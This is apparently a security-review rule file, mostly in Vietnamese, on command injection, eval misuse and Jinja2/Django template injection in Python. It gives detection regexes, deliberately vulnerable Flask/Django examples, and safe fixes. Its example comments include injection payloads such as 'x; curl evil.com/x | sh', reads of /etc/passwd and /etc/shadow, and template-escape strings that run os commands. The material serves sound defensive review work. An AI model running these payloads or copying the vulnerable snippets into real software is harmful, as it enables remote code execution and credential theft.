---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: python
---

# Command Injection — Python Specialization

> Override cho rule chung `rules/generic/21-command-injection.md`. Áp dụng khi `primary_language: python`.

## Intent (Python-specific)

Python có nhiều API "thuận tiện" cho shell mà ai cũng học từ tutorial: `os.system`, `os.popen`, `subprocess.run(..., shell=True)`. Vibe code rất hay viết:
```python
os.system(f"ping {host}")  # CRITICAL
```
Cộng với `eval`/`exec` cho user input (server-side RCE), và **Jinja2 template injection** — biến tướng đặc biệt nguy: `Template(user_input).render()` cho phép escape ra context globals (`{{ config.__class__.__init__.__globals__['os'].system('id') }}`) → RCE. Django template auto-escape mặc định an toàn hơn, nhưng `Template(user_input)` direct API vẫn có cùng vấn đề.

## Khi nào CRITICAL

- `subprocess.run/call/check_output/Popen` với `shell=True` và input từ L1
- `os.system(cmd)` với `cmd` chứa biến từ L1 (luôn shell)
- `os.popen(cmd)` (luôn shell)
- f-string / concat trong cmd: `f"ping {host}"`, `"ping " + host`
- `eval(user_input)`, `exec(user_input)`, `compile(user_input, ...)`
- `__import__(user_module)` với module name từ L1
- Jinja2 `Template(user_input).render(...)` → SSTI RCE
- Django `Template(user_input)` (class direct, không phải qua loader) → SSTI
- `os.execv`, `os.execvp` với args từ L1 chưa validate
- `subprocess` với `executable=` từ L1
- `shutil.copy(user_path, target)` — không command injection trực tiếp nhưng path traversal (cross-ref `10-path-traversal`)

## Khi nào HIGH (giảm cấp)

- `subprocess.run([list], shell=False)` — args là list, không shell (SAFE thường)
- Input đã qua whitelist regex `^[a-zA-Z0-9_-]+$`
- Input đã `shlex.quote()` — bảo vệ một phần nhưng vẫn nên dùng list form
- `eval` với `ast.literal_eval` (an toàn — chỉ literal)
- Template engine với autoescape on + không dùng `Template()` class trực tiếp

## Cách reasoning

1. **Grep** sink:
   - `subprocess\.(run|call|check_output|check_call|Popen)`, đặc biệt `shell\s*=\s*True`
   - `os\.system`, `os\.popen`, `os\.execv`, `os\.execvp`
   - `\beval\(`, `\bexec\(`, `compile\(`, `__import__\(`
   - `Template\(` (Jinja2/Django)
2. **Read** function, trace `cmd`/`args` từ:
   - Request: `request.args/form/json/files/POST/GET`
   - File upload filename
   - DB record có gốc L1
3. **Check shell**:
   - `shell=True` → luôn nguy nếu có L1
   - List form + `shell=False` → check args có metachar không (usually safe)
4. **Verify**:
   - Có `shlex.quote(s)` không? (giảm rủi ro nhưng không thay thế list form)
   - Có whitelist input không?
   - Template `autoescape=True` không?

## Search patterns

```
# subprocess shell=True
subprocess\.(run|call|check_output|check_call|Popen)\s*\([^)]*shell\s*=\s*True
subprocess\.(run|call|Popen)\s*\(\s*f["']
subprocess\.(run|call|Popen)\s*\(\s*["'][^"']*["']\s*\+

# os.system / os.popen — luôn shell
os\.system\s*\(
os\.popen\s*\(
commands\.(getoutput|getstatusoutput)  # Python 2 nhưng đôi khi còn

# os.exec*
os\.execv?p?e?\s*\(

# eval/exec
\beval\s*\(
\bexec\s*\(
\bcompile\s*\([^)]+\)\s*\)?[^;]*\bexec
__import__\s*\(

# Jinja2 / Django Template từ user string
jinja2\.Template\s*\(\s*(request\.|f["']|.*\+)
Template\s*\(\s*(request\.|f["']|.*\+)
\.from_string\s*\(\s*(request\.|f["'])
Environment\([^)]*\)\.from_string\s*\(

# Pickle / yaml load — RCE family (cross-ref 08)
pickle\.loads\s*\(
yaml\.load\s*\((?![^)]*Loader\s*=\s*(yaml\.)?SafeLoader)
```

## Examples

### CRITICAL — flag

```python
# Flask + subprocess shell=True với f-string
@app.post('/ping')
def ping():
    host = request.json['host']  # L1
    result = subprocess.run(
        f"ping -c 1 {host}",
        shell=True, capture_output=True, text=True
    )
    return result.stdout
# Exploit: host = "8.8.8.8; cat /etc/passwd"
```

```python
# Django + os.system
def convert_image(request):
    src = request.POST['src']  # L1
    os.system(f"convert {src} /tmp/out.png")  # CRITICAL
    # Exploit: src = "x; curl evil.com/x | sh"
```

```python
# FastAPI eval
@app.post('/calc')
async def calc(expr: str):
    return {"result": eval(expr)}  # L1 → RCE
# Exploit: expr = "__import__('os').system('id')"
```

```python
# Jinja2 SSTI
from jinja2 import Template

@app.post('/render')
def render():
    tpl = request.form['template']  # L1
    return Template(tpl).render(name='User')
# Exploit: tpl = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
```

```python
# Flask render_template_string với user input
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'world')  # L1
    return render_template_string(f"Hello {name}")  # SSTI
# Exploit: ?name={{7*7}} → "Hello 49" → escalate to RCE
```

```python
# subprocess Popen với shell=True
@app.post('/log')
def fetch_log():
    fname = request.json['file']  # L1
    p = subprocess.Popen(
        "tail -n 100 /var/log/" + fname,
        shell=True, stdout=subprocess.PIPE
    )
    return p.stdout.read()
# Exploit: file = "app.log; cat /etc/shadow"
```

```python
# __import__ từ user
@app.post('/load-plugin')
def load_plugin():
    name = request.json['name']  # L1
    mod = __import__(name)  # CRITICAL — load module bất kỳ
    return mod.run()
```

### NOT critical — không flag

```python
# subprocess list form, shell=False
result = subprocess.run(
    ['ping', '-c', '1', host],
    capture_output=True, text=True, timeout=5
)
# Argument tách rời, shell không parse → an toàn
# Vẫn nên validate host format
```

```python
# Whitelist trước
import re
if not re.match(r'^[a-zA-Z0-9.-]+$', host):
    abort(400)
subprocess.run(['ping', '-c', '1', host], check=True)
```

```python
# ast.literal_eval thay eval
import ast
result = ast.literal_eval(request.json['expr'])  # chỉ literal Python
```

```python
# Jinja2 với autoescape + template file (không Template class)
env = Environment(
    loader=FileSystemLoader('templates'),
    autoescape=select_autoescape(['html'])
)
tpl = env.get_template('hello.html')  # file cố định, không nhận user template
return tpl.render(name=request.args['name'])  # name escape an toàn
```

```python
# shlex.quote — partial mitigation (vẫn nên dùng list form)
import shlex
host_safe = shlex.quote(host)
subprocess.run(f"ping -c 1 {host_safe}", shell=True)  # hoạt động nhưng kém hơn list
```

## Fix recommendation

1. **Luôn dùng list form, `shell=False` mặc định**:
   ```python
   # BAD
   subprocess.run(f"ls {path}", shell=True)
   # GOOD
   subprocess.run(['ls', path])
   ```
2. **Tránh `os.system`, `os.popen` hoàn toàn** — chuyển sang `subprocess.run`.
3. **Không bao giờ `eval`/`exec` với input user**:
   ```python
   # Cần parse expression toán?
   import ast
   ast.literal_eval(s)  # literal
   # Hoặc dùng asteval, simpleeval (sandbox)
   from simpleeval import simple_eval
   simple_eval(expr)  # whitelist operator
   ```
4. **Whitelist** input format trước khi truyền vào shell:
   ```python
   import re
   if not re.fullmatch(r'[a-zA-Z0-9._-]+', name):
       raise ValueError("Invalid name")
   ```
5. **Jinja2** — KHÔNG `Template(user_input)`. Dùng template file cố định:
   ```python
   env = Environment(loader=FileSystemLoader('templates'),
                     autoescape=True)
   env.get_template('user.html').render(data=data)
   # Render content bằng auto-escape, không cho user write template
   ```
6. **Sandbox subprocess**:
   - `subprocess.run(..., timeout=5)` chống infinite loop
   - `cwd=`, `env=` clean để không kế thừa secrets
   - User-level container/jail nếu chạy untrusted code
7. **`shlex.quote`** chỉ dùng làm defense-in-depth. Vẫn ưu tiên list form.
8. **Static analysis**: chạy `bandit` để bắt `B602` (`subprocess shell=True`), `B605` (`os.system`), `B307` (`eval`), `B701` (`Jinja2 autoescape off`).

## Cross-references

- Python `08-insecure-deserialization`: `pickle.loads`, `yaml.load` cũng là RCE family
- Python `02-sql-injection`: cùng pattern f-string vào sink → cùng họ injection
- Generic `10-path-traversal`: `subprocess.run(['cat', user_path])` an toàn cmd nhưng path vẫn nguy
- Generic `16-unrestricted-file-upload`: file upload → server-side processing với subprocess thường là điểm exploit
- Python `17-verbose-error-debug-mode`: stack trace leak có thể tiết lộ shell command structure giúp attacker
